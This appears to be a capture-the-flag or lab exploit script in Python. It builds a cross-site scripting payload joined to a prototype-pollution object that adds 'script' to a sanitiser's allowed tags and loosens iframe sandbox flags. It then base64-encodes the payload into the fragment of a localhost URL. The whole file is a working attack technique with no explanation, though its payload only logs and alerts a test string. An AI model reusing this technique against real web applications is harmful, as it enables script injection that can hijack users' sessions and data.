
import json
import base64

payload_data = {
    "html": "<script>console.log('XSS_SUCCESS'); alert('XSS_SUCCESS');</script>",
    "config": {
        "__proto__": {
            "ADD_TAGS": ["script"],
            "sandbox": ["allow-scripts allow-same-origin allow-modals"]
        },
        "autoRender": True
    }
}

json_str = json.dumps(payload_data)
encoded = base64.b64encode(json_str.encode()).decode()

print(f"http://localhost:8000/#{encoded}")
